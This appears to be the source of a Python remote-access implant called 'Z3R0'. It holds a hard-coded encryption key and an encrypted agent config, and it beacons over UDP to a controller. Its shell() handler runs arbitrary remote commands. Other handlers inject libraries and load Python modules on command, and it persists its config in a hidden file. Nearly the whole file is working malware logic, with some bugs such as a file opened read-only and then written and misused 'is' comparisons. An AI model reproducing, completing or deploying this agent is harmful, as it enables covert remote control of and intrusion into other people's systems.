import ctypes
import random
import multiprocessing
import threading
import json
import time
import os
import subprocess
from cryptography import fernet
from socket import *
import struct
import base64
import pathlib
import hashlib
import math
import sys

MODULE_NAME = "Z3R0"
AES_KEY = "SFOxEwE1dzrTsXGjASTnOLSRG8zaV25_B1GeGuC2r-8="
AGENT_SETTINGS = 'gAAAAABez2Jy_lFKbLQYbgaccMPVz8BjGlf4oG9AkCLCdB6zW246tdXMBzg2SlaORgjUhLe88a32pMPqoSSTHHJ4IqtErUL1LKJ74Ncodm-kZkyBr_h_bxT33XLis4uoyVucYdHKVFcXrZg6MS9NhrBFeFSt3ZfcnKW71s4hBNuXN3XC3gGWQkrF2ieVoSndCDyxpNu_gynHMqL1yYufwRmGQlC1M6FFE-_sb61N2etWUGFmbJlQ3jzIGZAeDoXQ7tS5L0UruDwslauTjYoZ_n7y5VfddjMI865SPrcgFL4QA6C33mkkS39F9IyeGt_0cmllYm3c1RWRvQMgPgaYBvtW1HWy0FAO1A=='
CONFIG_FILE = ".01ba4719c80b6"

DLL_MODULE_TABLE = {}
PY3_MODULE_TABLE = {}
NET_SOCKETS = {}
AGENT_CONFIGS = {}
MODULE_ID = 0
THREAD_COUNTER = 0

aes_crypto = fernet.Fernet(AES_KEY)
prober = socket(AF_INET,SOCK_DGRAM)
prober.settimeout(1)

from codes import *
from netapi import *
from so_loader import *
from pyloader import *
from subshell import *
from probe_id import *

netapi = NetAPI(NET_SOCKETS)
so_loader = SOLoader(DLL_MODULE_TABLE)
py3_loader = PY3Loader(PY3_MODULE_TABLE)
sub_shell = SubShellAPI()

def crypto(args):
	if (args[0]['mode'] == LOCK):
		try:
			return aes_crypto.encrypt(args[0]['data'].encode())
		except:
			return aes_crypto.encrypt(b"[CRYPTO]:[LOCK]::[EXCEPTION]")

	elif (args[0]['mode'] == ULCK):
		try:
			return aes_crypto.decrypt(args[0]['data'])
		except:
			return b"[CRYPTO]:[UNLOCK]::[EXCEPTION]"


def net(args):
	return netapi.ioctl(args[0])

def dll_loader(args):
	return so_loader.ioctl(args[0])

def py_loader(args):
	return py3_loader.ioctl(args[0])

def shell(args):
	try:
		cmd = args[0]['cmd'].split(" ")

		if os.name == "nt":
			random_file_id = str(time.time()).encode()
			md5 = hashlib.md5()
			md5.update(random_file_id)

			temp_dir = "C:\\Windows\\Temp"
			file_hash = md5.hexdigest()+".dll"
			temp_file_path = "{}\\{}".format(temp_dir,file_hash)
			ret_code = os.system("{} > {}".format(args[0]['cmd'],temp_file_path))

			fst = open(temp_file_path,"rb")
			data = fst.read()
			fst.close()

			cwd = os.getcwd()
			os.chdir(temp_dir)
			os.unlink(temp_file_path)
			os.chdir(cwd)
			return json.dumps([ret_code,data.decode(),'SHELL RUN:[-_-]'])

		elif os.name == "posix":
			data = subprocess.run(cmd,stdout=subprocess.PIPE,stderr=subprocess.PIPE)
			return json.dumps([data.returncode,data.stdout.decode(),data.stderr.decode()])

	except Exception as e:
		return json.dumps([255,"[!]:[NO STDOUT]","[!]:{}".format(e)])

def save_configs(args):
		try:
			data = json.dumps(AGENT_CONFIGS)
			fd = open(CONFIG_FILE,'rb')
			fd.write(data)
			fd.close()
		except:
			return None

def probe(args):

	PROBE_DATA = "{}:{}".format(MODULE_NAME,probe_id(THREAD_COUNTER))

	while  True:
		encrypted_probe = sub_shell.ioctl(['CRYPTO',{'data':PROBE_DATA,'mode':LOCK}])
		for counter in range(0,7):
			prober.sendto(encrypted_probe,tuple(args[0]['addr']))
		time.sleep(random.randint(1,5))
		try:
			data,caddr = prober.recvfrom(BUFFER_SIZE)
			probe = sub_shell.ioctl(["CRYPTO",{'data':data,'mode':ULCK}])
			PROBE_DATA = "{}:{}".format(MODULE_NAME,probe_id(THREAD_COUNTER))
			globals()["THREAD_COUNTER"] += 1
			return probe
		except:
			pass

def startup():
	try:
		sub_shell.add_module({'cmd':'CRYPTO','module':crypto})
		sub_shell.add_module({'cmd':'NETCTL','module':net})
		sub_shell.add_module({'cmd':'LIBLDR','module':dll_loader})
		sub_shell.add_module({'cmd':'PY3LDR','module':py_loader})
		sub_shell.add_module({'cmd':'SSHELL','module':shell})
		sub_shell.add_module({'cmd':'NPROBE','module':probe})
		sub_shell.add_module({'cmd':'SAVCFG','module':save_configs})

		fd = open(CONFIG_FILE,"rb")
		data = fd.read()
		fd.close()
		config_data = sub_shell.ioctl(['CRYPTO',{'data':data,'mode':ULCK}])
		return json.loads(config_data)
	except:
		config_data = sub_shell.ioctl(['CRYPTO',{'data':AGENT_SETTINGS.encode(),'mode':ULCK}])
		fd = open(CONFIG_FILE,"wb")
		fd.write(AGENT_SETTINGS.encode())
		fd.close()
		return json.loads(config_data)

def init_load(config):
	try:
		for mod in config['modules']:
			try:
				path = mod.split(":")[0]
				id = mod.split(":")[1]

				if id is 'SOL':
					sub_shell.ioctl(['LIBLDR',['INJECT',{'path':path,'id':MODULE_ID}]])
					MODULE_ID += 1
				elif id is 'PY3':
					sub_shell.ioctl(['PY3LDR',['RUNMOD',{'path':path}]])
			except:
				pass
	except:
		return None

